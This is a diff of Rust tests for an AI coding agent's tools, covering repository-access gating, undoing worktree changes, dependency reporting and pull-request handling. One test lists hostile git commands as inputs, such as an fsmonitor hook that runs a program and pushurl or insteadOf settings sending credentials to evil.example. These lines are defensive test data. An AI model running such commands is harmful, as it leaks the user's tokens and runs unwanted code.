@@ -423,6 +423,62 @@ async fn prepare_workspace_without_a_base_branch_starts_from_the_remotes_default
     }
 }
 
+/// A repository nobody named is not probed by leaving the base branch out: the default branch is
+/// asked of the remote with the credentials, so the gate comes first. Refused, the remote sees no
+/// request and no mirror is made; named, the same call reaches it.
+#[tokio::test]
+async fn an_unnamed_repository_is_not_probed_for_its_default_branch() {
+    use adam_workspace::{ScopedToken, Workspaces};
+    use wiremock::matchers::any;
+    use wiremock::{Mock, MockServer, ResponseTemplate};
+
+    let rig = Rig::new().await;
+    let remote = MockServer::start().await;
+    Mock::given(any())
+        .respond_with(ResponseTemplate::new(404))
+        .mount(&remote)
+        .await;
+    let host = format!("127.0.0.1:{}", remote.address().port());
+    let work = rig.fx.tmp.path().join("probe-work");
+    let env = Arc::new(ToolEnv::new(
+        Workspaces::new(
+            work.clone(),
+            Arc::new(ScopedToken::new(host.as_str(), common::GITHUB_TOKEN)),
+        )
+        .allow_hosts([host.clone()])
+        .allow_local(true),
+        rig.fx.env.code_host.clone(),
+        rig.fx.env.settings.clone(),
+    ));
+    let ctx = ToolCtx::detached("tool", "call-x", Arc::new(CollectingSink::new()))
+        .with_state(env.clone());
+    let probe = json!({"repo_url": format!("http://{host}/octo/private.git")});
+
+    let out = PrepareWorkspace.call(&ctx, probe.clone()).await;
+    assert!(is_error(&out), "{out:?}");
+    assert!(text(out).contains("ask_user"));
+    assert!(
+        remote.received_requests().await.unwrap().is_empty(),
+        "no request reached the remote"
+    );
+    assert!(!work.join("git").exists(), "no mirror was made");
+    // The branch form of the probe is refused the same way.
+    let with_branch =
+        json!({"repo_url": format!("http://{host}/octo/private.git"), "branch": "agent/x"});
+    assert!(is_error(&PrepareWorkspace.call(&ctx, with_branch).await));
+    assert!(remote.received_requests().await.unwrap().is_empty());
+
+    // Named: the same call goes past the gate and asks the remote.
+    say(
+        &env,
+        &ctx,
+        &format!("work on http://{host}/octo/private.git"),
+    )
+    .await;
+    let _ = PrepareWorkspace.call(&ctx, probe).await;
+    assert!(!remote.received_requests().await.unwrap().is_empty());
+}
+
 #[tokio::test]
 async fn tools_that_need_a_workspace_say_so() {
     let rig = Rig::new().await;
@@ -1440,6 +1496,118 @@ async fn run_command_undoes_a_change_and_says_where_changes_go() {
     assert!(reading.content.contains("notes.txt"), "{}", reading.content);
 }
 
+/// What a command could change without touching a file of the worktree, and that later commands
+/// of the coder's own (`git status`, the push that carries the token) would act on: git's
+/// configuration and the refs. The refs of other runs (`agent/*`) are theirs and not compared.
+#[tokio::test]
+async fn run_command_undoes_changes_to_the_git_configuration_and_to_refs() {
+    let rig = Rig::new().await;
+    rig.prepare().await;
+    let dir = rig.worktree();
+    common::git(&dir, &["branch", "keep"]);
+    // (Restoring a key appends it: where it sits in the file does not matter.)
+    let config = |d: &std::path::Path| {
+        let mut lines: Vec<String> = common::git(d, &["config", "--local", "--list"])
+            .lines()
+            .map(str::to_owned)
+            .collect();
+        lines.sort();
+        lines
+    };
+    let refs = |d: &std::path::Path| {
+        common::git(
+            d,
+            &[
+                "for-each-ref",
+                "--format=%(refname) %(objectname)",
+                "refs/heads",
+                "refs/tags",
+            ],
+        )
+    };
+    let (config_before, refs_before) = (config(&dir), refs(&dir));
+
+    for command in [
+        // A program git runs on every `status`.
+        "git config core.fsmonitor 'touch /tmp/adam-fsmonitor-ran'",
+        // Where the credentials would go.
+        "git config remote.origin.pushurl https://evil.example/octo/widgets.git",
+        "git config url.https://evil.example/.insteadOf https://github.com/",
+        "git config alias.status '!echo pwned'",
+        "git config --unset remote.origin.url",
+        // Refs outside the run's own branch.
+        "git branch created",
+        "git tag v1",
+        "git update-ref refs/heads/zzz HEAD",
+        "git branch -D keep",
+        "git update-ref -d refs/heads/keep && git branch keep2",
+    ] {
+        let out = RunCommand
+            .call(&rig.ctx, json!({ "command": command }))
+            .await
+            .unwrap();
+        assert!(out.is_error, "{command}: {}", out.content);
+        assert!(
+            out.content.contains("changed the worktree")
+                && out.content.contains("exactly as it was"),
+            "{command}: {}",
+            out.content
+        );
+        assert_eq!(config(&dir), config_before, "{command}: the configuration");
+        assert_eq!(refs(&dir), refs_before, "{command}: the refs");
+    }
+    // Other runs' branches move while a command runs: that is not this command's change. A
+    // command that only reads is not refused for it.
+    let read = RunCommand
+        .call(
+            &rig.ctx,
+            json!({"command": "git config --local --list | head -3; git for-each-ref"}),
+        )
+        .await
+        .unwrap();
+    assert!(!read.is_error, "{}", read.content);
+    assert!(!std::path::Path::new("/tmp/adam-fsmonitor-ran").exists());
+}
+
+/// An embedded repository with no commit makes `git add -A` fail, so there is no tree id: the
+/// snapshot falls back to `git status`, so that looking around still works (it used to refuse
+/// every command), a change is still seen, and nothing is "restored" from a tree that does not
+/// exist.
+#[tokio::test]
+async fn run_command_still_works_when_the_tree_cannot_be_computed() {
+    let rig = Rig::new().await;
+    rig.prepare().await;
+    let dir = rig.worktree();
+    let embedded = dir.join("vendor/embedded");
+    std::fs::create_dir_all(&embedded).unwrap();
+    common::git(&embedded, &["init", "--quiet"]);
+    std::fs::write(embedded.join("f.txt"), "x\n").unwrap();
+
+    let ls = RunCommand
+        .call(
+            &rig.ctx,
+            json!({"command": "ls vendor; git status --short"}),
+        )
+        .await
+        .unwrap();
+    assert!(!ls.is_error, "{}", ls.content);
+    assert!(ls.content.contains("embedded"), "{}", ls.content);
+
+    // A change is seen. The files are not written back (there is nothing exact to write), and the
+    // model is told.
+    let changed = RunCommand
+        .call(&rig.ctx, json!({"command": "echo y > added.txt"}))
+        .await
+        .unwrap();
+    assert!(changed.is_error, "{}", changed.content);
+    assert!(
+        changed.content.contains("changed the worktree")
+            && changed.content.contains("could not be fully undone"),
+        "{}",
+        changed.content
+    );
+}
+
 /// A toolchain the workspace lacks is reported as that: the workspace lacks it, no cycle is used,
 /// no failing `checks` artifact exists, and the model is told to report and wait (nothing is
 /// installed).
@@ -1527,6 +1695,61 @@ async fn a_missing_toolchain_is_reported_and_costs_nothing() {
     assert_eq!(failures(&rig).await, 1);
 }
 
+/// A tool the project brings itself is a dependency to install with the project's own command, not
+/// a toolchain to wait for; and a "not found" printed by a nested shell in a run that failed on
+/// its own terms is a failed check, costing its cycle.
+#[tokio::test]
+async fn a_project_dependency_is_to_be_installed_and_a_nested_not_found_is_a_failed_check() {
+    let rig = Rig::new().await;
+    rig.prepare().await;
+    let dir = rig.worktree();
+    std::fs::write(
+        dir.join("package.json"),
+        r#"{"devDependencies": {"zzz-local-tool": "1"}}"#,
+    )
+    .unwrap();
+    std::fs::write(dir.join("pnpm-lock.yaml"), "").unwrap();
+    for out in [
+        RunChecks
+            .call(&rig.ctx, json!({"command": "zzz-local-tool --run"}))
+            .await
+            .unwrap(),
+        RunCommand
+            .call(&rig.ctx, json!({"command": "zzz-local-tool --run"}))
+            .await
+            .unwrap(),
+    ] {
+        assert!(out.is_error, "{}", out.content);
+        let said = &out.content;
+        assert!(
+            said.contains("`zzz-local-tool` is not on the PATH")
+                && said.contains("this project's own dependencies")
+                && said.contains("`pnpm install`")
+                && said.contains("no check cycle was used")
+                && !said.contains("missing toolchain, not a failing check"),
+            "{said}"
+        );
+        assert!(out.artifacts.is_empty());
+    }
+    assert_eq!(failures(&rig).await, 0);
+
+    // A nested shell says "not found", and the run fails on its own terms: a failed check.
+    let red = RunChecks
+        .call(
+            &rig.ctx,
+            json!({"command": "sh -c 'zzz-inner-tool'; echo tests failed; exit 101"}),
+        )
+        .await
+        .unwrap();
+    assert!(
+        red.is_error && red.content.contains("failed check run 1"),
+        "{}",
+        red.content
+    );
+    assert_eq!(red.artifacts.len(), 1, "reported as a failed check");
+    assert_eq!(failures(&rig).await, 1);
+}
+
 /// Bash constructs work in both tools where the image has bash (the owner's `${PIPESTATUS[0]}`
 /// was "Bad substitution" under dash).
 #[tokio::test]
@@ -1577,6 +1800,17 @@ fn pushed_lines(result: &str) -> (String, String) {
 /// agent does before each step, the person's words (naming `repo`) and the branches the carried
 /// `commit_and_push` results reported are put in the notes.
 async fn next_task(fx: &Fixture, repo: &str, pushed: &[(&str, &str)]) -> ToolCtx {
+    next_task_with_base(fx, repo, pushed, Some("main")).await
+}
+
+/// [`next_task`], where what the first task's notes recorded as the base of the branches is `base`
+/// (`None`: the notes did not have one, as when the branches come from the result text).
+async fn next_task_with_base(
+    fx: &Fixture,
+    repo: &str,
+    pushed: &[(&str, &str)],
+    base: Option<&str>,
+) -> ToolCtx {
     let ctx = ToolCtx::detached("tool", "call-1", Arc::new(CollectingSink::new()))
         .with_state(fx.env.clone());
     say(&fx.env, &ctx, repo).await;
@@ -1585,6 +1819,8 @@ async fn next_task(fx: &Fixture, repo: &str, pushed: &[(&str, &str)]) -> ToolCtx
     notes.name_pushed_branches(pushed.iter().map(|(repo, branch)| PushedBranch {
         repo: adam_coder::tools::named::key_of_argument(repo).unwrap(),
         branch: (*branch).to_owned(),
+        // What `commit_and_push` of the first task recorded, and the next task inherits.
+        base: base.map(str::to_owned),
     }));
     fx.env.notes.save(&run, &notes).await.unwrap();
     ctx
@@ -1974,4 +2210,185 @@ async fn a_continued_branch_that_moved_on_the_remote_is_not_overwritten_by_open_
         .await
         .unwrap();
     assert!(notes.pull_request.is_none());
+}
+
+/// A rework works against the base of the pull request it continues: the model's base is not
+/// used when the notes recorded one, and a branch with no recorded base (it came from the result
+/// text) still finds its pull request by head, so no second pull request is opened against
+/// another base.
+#[tokio::test]
+async fn a_continued_branch_keeps_the_base_of_its_pull_request() {
+    let rig = Rig::new().await;
+    let remote = rig.fx.remote_url();
+    common::git(&rig.fx.remote, &["branch", "develop", "refs/heads/main"]);
+    let (first_two, _worktree, branch, _tip) = rework_of_an_open_pull_request(&rig).await;
+    // The notes the first task wrote recorded the base.
+    let first = rig
+        .fx
+        .env
+        .notes
+        .load(&rig.ctx.run_id().to_string())
+        .await
+        .unwrap();
+    assert_eq!(
+        first.pushed_base(
+            &adam_coder::tools::named::key_of_argument(&remote).unwrap(),
+            &branch
+        ),
+        Some("main")
+    );
+    drop(first_two);
+
+    // Recorded: the model says `develop`, the run works against `main`.
+    let two = next_task(&rig.fx, &remote, &[(&remote, &branch)]).await;
+    let ready = PrepareWorkspace
+        .call(
+            &two,
+            json!({"repo_url": remote, "base_branch": "develop", "branch": branch}),
+        )
+        .await
+        .unwrap();
+    assert!(!ready.is_error, "{}", ready.content);
+    assert!(
+        ready.content.contains("base branch: main"),
+        "{}",
+        ready.content
+    );
+
+    // Not recorded (the branch came from the text of a result): the model's `develop` is what
+    // the run has, and the pull request of the branch is still found, once, against `main`.
+    let three = next_task_with_base(&rig.fx, &remote, &[(&remote, &branch)], None).await;
+    let ready = PrepareWorkspace
+        .call(
+            &three,
+            json!({"repo_url": remote, "base_branch": "develop", "branch": branch}),
+        )
+        .await
+        .unwrap();
+    assert!(
+        ready.content.contains("base branch: develop"),
+        "{}",
+        ready.content
+    );
+    let dir = rig
+        .fx
+        .root
+        .join("worktrees")
+        .join(three.run_id().to_string());
+    std::fs::write(dir.join("three.txt"), "three\n").unwrap();
+    RunChecks
+        .call(&three, json!({"command": "true"}))
+        .await
+        .unwrap();
+    CommitAndPush
+        .call(&three, json!({"message": "fix: three"}))
+        .await
+        .unwrap();
+    let args = json!({"title": "fix: three", "body": "Three.\n\n## Verification\n- `true`"});
+    let reported = OpenPullRequest.call(&three, args).await.unwrap();
+    assert!(
+        reported.content.contains("was already open") && reported.content.contains(PR_URL),
+        "{}",
+        reported.content
+    );
+    assert_eq!(
+        rig.fx.created_pulls().await.len(),
+        1,
+        "no second pull request"
+    );
+    // The branch was recorded with the base the run worked against.
+    let notes = rig
+        .fx
+        .env
+        .notes
+        .load(&three.run_id().to_string())
+        .await
+        .unwrap();
+    assert_eq!(
+        notes.pushed_base(
+            &adam_coder::tools::named::key_of_argument(&remote).unwrap(),
+            &branch
+        ),
+        Some("develop")
+    );
+}
+
+/// A comment that cannot be posted does not make the update "not updated": the branch has the
+/// commits, the pull request is reported with a warning, the verdict says so if the run ends; and
+/// the note is posted once per pushed commit, not again by a repeated call.
+#[tokio::test]
+async fn a_comment_that_fails_leaves_the_update_delivered_and_the_note_is_posted_once() {
+    let rig = Rig::new().await;
+    let (two, worktree, branch, tip) = rework_of_an_open_pull_request(&rig).await;
+    std::fs::write(worktree.join("two.txt"), "unverified\n").unwrap();
+    RunChecks
+        .call(&two, json!({"command": "exit 1"}))
+        .await
+        .ok();
+    CommitAndPush
+        .call(&two, json!({"message": "fix: two"}))
+        .await
+        .unwrap();
+    let args = json!({
+        "title": "fix: two",
+        "body": "Two.\n\n## Verification\n- none",
+        "accept_red_checks": true
+    });
+
+    common::comments_fail_with(&rig.fx.github, 403).await;
+    let reported = OpenPullRequest.call(&two, args.clone()).await.unwrap();
+    assert!(!reported.is_error, "{}", reported.content);
+    assert!(
+        reported.content.contains("could not be posted")
+            && reported.content.contains("tell the person"),
+        "{}",
+        reported.content
+    );
+    assert_ne!(
+        common::git(
+            &rig.fx.remote,
+            &["rev-parse", &format!("refs/heads/{branch}")]
+        ),
+        tip,
+        "the branch has the commits"
+    );
+    let notes = rig
+        .fx
+        .env
+        .notes
+        .load(&two.run_id().to_string())
+        .await
+        .unwrap();
+    assert!(notes.published && notes.pull_request.is_some());
+    assert_eq!(
+        notes.pull_request.as_ref().unwrap().commented_sha,
+        None,
+        "not posted, so a repeat tries again"
+    );
+}
+
+/// The note is posted once for a pushed commit: the same call again (a crash before it was
+/// journaled) finds it in the notes.
+#[tokio::test]
+async fn the_red_checks_note_is_not_posted_twice_for_the_same_commit() {
+    let rig = Rig::new().await;
+    let (two, worktree, _branch, _tip) = rework_of_an_open_pull_request(&rig).await;
+    std::fs::write(worktree.join("two.txt"), "unverified\n").unwrap();
+    CommitAndPush
+        .call(&two, json!({"message": "fix: two"}))
+        .await
+        .unwrap();
+    let args = json!({
+        "title": "fix: two",
+        "body": "Two.\n\n## Verification\n- none",
+        "accept_red_checks": true
+    });
+    OpenPullRequest.call(&two, args.clone()).await.unwrap();
+    OpenPullRequest.call(&two, args).await.unwrap();
+    assert_eq!(
+        rig.fx.comments().await.len(),
+        1,
+        "{:?}",
+        rig.fx.comments().await
+    );
 }
